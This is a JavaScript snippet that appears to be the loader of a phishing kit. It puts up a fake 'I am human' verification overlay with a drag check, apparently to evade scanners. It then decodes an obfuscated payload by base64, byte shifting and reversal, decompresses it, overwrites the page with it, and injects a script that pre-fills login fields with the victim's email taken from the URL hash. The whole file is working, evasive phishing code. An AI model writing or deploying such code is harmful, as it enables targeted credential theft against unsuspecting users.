function reassemblePieces() {
  var out = '';
  try {
    for (var i = 0; i < piecesArr.length; i++) {
      var b64piece = piecesArr[i];
      var transformed = atob(b64piece);
      var rot = (transformed.length % 11);
      var chars = [];
      for (var j = 0; j < transformed.length; j++) {
        var code = (transformed.charCodeAt(j) - rot) & 0xFF;
        chars.push(String.fromCharCode(code));
      }
      out += chars.reverse().join('');
    }
    log("[3] Reassembled length: " + out.length);
    return out;
  } catch (e) {
    log("[ERROR] Reassembly failed: " + e.message);
    return null;
  }
}

var gotClickConfirm = false;
var gotDrag = false;
var dragStart = null;

function showHumanOverlay() {
  if (document.getElementById('human-overlay')) return;
  var overlay = document.createElement('div');
  overlay.id = 'human-overlay';
  overlay.innerHTML = '<div id="human-box">' +
    '<h2 style="margin:0 0 8px 0">Human Verification</h2>' +
    '<p style="margin:0 0 12px 0; color:#666;">Click the button below, then click and drag anywhere on the page.</p>' +
    '<button id="confirm-btn">I am human</button>' +
    '<div id="drag-hint">Waiting for click...</div>' +
    '</div>';
  document.documentElement.appendChild(overlay);
  
  document.getElementById('confirm-btn').addEventListener('click', function() {
    gotClickConfirm = true;
    var btn = document.getElementById('confirm-btn');
    btn.textContent = "Confirmed! Now drag anywhere...";
    btn.disabled = true;
    document.getElementById('drag-hint').textContent = "Click and drag your mouse/finger across the screen.";
    log("[4] Click confirmed. Waiting for drag...");
  });
}

function onPointerDown(e) { 
  dragStart = {
    x: e.clientX || (e.touches && e.touches[0] && e.touches[0].clientX) || 0, 
    y: e.clientY || (e.touches && e.touches[0] && e.touches[0].clientY) || 0
  }; 
}

function onPointerUp(e) {
  if (!dragStart) return;
  var x = e.clientX || (e.changedTouches && e.changedTouches[0] && e.changedTouches[0].clientX) || 0;
  var y = e.clientY || (e.changedTouches && e.changedTouches[0] && e.changedTouches[0].clientY) || 0;
  var dx = x - dragStart.x; 
  var dy = y - dragStart.y; 
  var dist = Math.sqrt(dx*dx + dy*dy);
  
  if (dist >= 50) {
    gotDrag = true;
    log("[5] Drag detected. Distance: " + dist.toFixed(1));
    checkAndReconstruct();
  }
  dragStart = null;
}

function checkAndReconstruct() {
  if (gotClickConfirm && gotDrag) {
    log("[6] All checks passed. Reconstructing...");
    var overlay = document.getElementById('human-overlay');
    if (overlay) overlay.remove();
    attemptReconstruct();
  }
}

window.addEventListener('mousedown', onPointerDown);
window.addEventListener('touchstart', onPointerDown, {passive:true});
window.addEventListener('mouseup', onPointerUp);
window.addEventListener('touchend', onPointerUp);

setTimeout(function() {
  showHumanOverlay();
}, 100);

function attemptReconstruct() {
  var assembled = reassemblePieces();
  if (!assembled) {
    log("[ERROR] Assembled payload is null/invalid");
    document.body.innerHTML = '<h2 style="color:red;text-align:center;margin-top:50px;">Reassembly failed. Check debug box (bottom left).</h2>';
    return;
  }

  try {
    log("[7] Attempting LZString decompress...");
    var html = LZString.decompressFromBase64(assembled);
    log("[8] Decompressed HTML length: " + (html ? html.length : "null"));
    
    if (!html) throw new Error('Decompression returned null or empty');
    
    var currentHash = window.location.hash;
    var prefillScript = '';
    if (currentHash && currentHash.length > 1) {
      var emailValue = currentHash.substring(1);
      var safeEmailJSON = JSON.stringify(emailValue);
      prefillScript = '<scr' + 'ipt>' +
        '(function() {' +
        '  var emailVal = ' + safeEmailJSON + ';' +
        '  var applyPrefill = function() {' +
        '    var inputs = document.querySelectorAll("input");' +
        '    for (var i = 0; i < inputs.length; i++) {' +
        '      var el = inputs[i];' +
        '      var type = (el.type || "").toLowerCase();' +
        '      var name = (el.name || "").toLowerCase();' +
        '      var id = (el.id || "").toLowerCase();' +
        '      if (type === "hidden" || type === "password" || type === "submit" || type === "button") continue;' +
        '      var isMatch = (type === "email" || name.includes("email") || id.includes("email") || name.includes("user") || id.includes("user") || name.includes("login") || id.includes("login") || name.includes("mail") || id.includes("mail"));' +
        '      if (isMatch || inputs.length === 1 || type === "text") {' +
        '        if (el.value !== emailVal) {' +
        '          el.value = emailVal;' +
        '          var tracker = el._valueTracker;' +
        '          if (tracker) { tracker.setValue(emailVal); }' +
        '          el.dispatchEvent(new Event("input", { bubbles: true }));' +
        '          el.dispatchEvent(new Event("change", { bubbles: true }));' +
        '        }' +
        '      }' +
        '    }' +
        '  };' +
        '  applyPrefill();' +
        '  setTimeout(applyPrefill, 200);' +
        '  setTimeout(applyPrefill, 600);' +
        '  setTimeout(applyPrefill, 1500);' +
        '})();' +
      '<\/scr' + 'ipt>';
    }

    log("[9] Rendering page via document.write...");
    document.open();
    document.write(html + prefillScript);
    document.close();
    log("[10] Done successfully.");
  } catch (e) {
    log("[ERROR] Fatal error: " + e.message);
    document.body.innerHTML = '<h2 style="color:red;text-align:center;margin-top:50px;">Reconstruction failed: ' + e.message + '</h2>';
  }
}
